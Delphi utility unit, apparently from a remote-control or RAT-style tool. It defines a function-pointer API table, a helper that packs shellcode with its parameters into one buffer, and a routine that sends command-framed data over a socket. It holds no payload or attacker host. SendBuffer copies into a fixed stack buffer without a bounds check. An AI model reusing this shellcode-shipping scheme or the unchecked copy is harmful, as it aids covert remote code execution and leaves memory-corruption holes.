unit untUtils;
interface
uses
  Windows,
  winsock;
type
  xGetProcAddress = function(hModule: HMODULE; lpProcName: LPCSTR): FARPROC; stdcall;
  xLoadLibrary = function(strLib:PChar): HMODULE; stdcall;
  xGetMemory = function(dwLen:Integer):Pointer;
  xFreeMemory = procedure(ptrMemory:Pointer);
  xCopyMemory = procedure(pDestiny, pSource:Pointer; dwLen:Integer);
  xZeroMemory = procedure(Destination: Pointer; Length: DWORD);
  xwsprintfA = function (lpOut: PChar; lpFmt: PChar; lpVars: Array of Const):Integer;
  xSendBuffer = function (hSocket: Integer; bySocketCmd: Byte; lpszBuffer: PWideChar; iBufferLen: Integer): Boolean;
  xMessageBox = function(hWnd: HWND; lpText, lpCaption: PChar; uType: UINT): Integer; stdcall;

type
  TAPIBlock = record
    hSocket:            Cardinal;
    hKernelHandle:      Cardinal;
    pGetProcAddress:    xGetProcAddress;
    pLoadLibraryA:      xLoadLibrary;
    pGetMemory:         xGetMemory;
    pFreeMemory:        xFreeMemory;
    pCopyMemory:        xCopyMemory;
    pZeroMemory:        xZeroMemory;
    pwsprintfA:         xwsprintfA;
    pSendBuffer:        xSendBuffer;
    pMessageBox:        xMessageBox;
  end;
  PAPIBlock = ^TAPIBlock;

type
  LPSocketHeader = ^TSocketHeader;
  TSocketHeader = packed Record
    dwSocketLen: DWORD;
    bSocketCmd: Byte;
  end;
  
type
  TShellCodeFunc = procedure (ptrData:Pointer; dwLen:Integer; ptrAPIBlock:PAPIBlock); stdcall;
  PShellCodeFunc = ^TShellCodeFunc;
function SendBuffer(hSocket: Integer; bySocketCmd: Byte; lpszBuffer: PWideChar; iBufferLen: Integer): Boolean;
function prepShellCodeWithParams(pFunc, pParam:Pointer; dwFunc, dwParam:Cardinal; var buffLen:Cardinal):Pointer;
implementation

function prepShellCodeWithParams(pFunc, pParam:Pointer; dwFunc, dwParam:Cardinal; var buffLen:Cardinal):Pointer;
var
  pResult:Pointer;
begin
  buffLen := dwFunc + dwParam + 4;
  Result := GetMemory(buffLen);
  if Result <> nil then
  begin
    pResult := Result;
    CopyMemory(pResult, @dwParam,4);
    Inc(PByte(pResult), 4);
    if dwParam > 0 then
    begin
      CopyMemory(pResult, pParam, dwParam);
      inc(PByte(pResult), dwParam);
    end;
    CopyMemory(pResult, pFunc, dwFunc);
  end;
end;

function SendBuffer(hSocket: Integer; bySocketCmd: Byte; lpszBuffer: PWideChar; iBufferLen: Integer): Boolean;
var
  lpszSendBuffer: Pointer;
  szSendBuffer: Array[0..2047] Of WideChar;
  iSendLen: Integer;
begin
  Result := False;
  ZeroMemory(@szSendBuffer, SizeOf(szSendBuffer));
  lpszSendBuffer := Pointer(DWORD(@szSendBuffer) + SizeOf(TSocketHeader));
  if ((iBufferLen > 0) and (lpszBuffer <> nil)) then
  begin
    CopyMemory(lpszSendBuffer, lpszBuffer, iBufferLen);
  end;
  with LPSocketHeader(@szSendBuffer)^ do
  begin
    dwSocketLen := iBufferLen + 1;
    bSocketCmd := bySocketCmd;
  end;
  Dec(DWORD(lpszSendBuffer));
  iBufferLen := iBufferLen + SizeOf(TSocketHeader);
  iSendLen := send(hSocket, szSendBuffer, iBufferLen, 0);
  if (iSendLen = iBufferLen) then
    Result := True;
  Sleep(0);
end;
end.
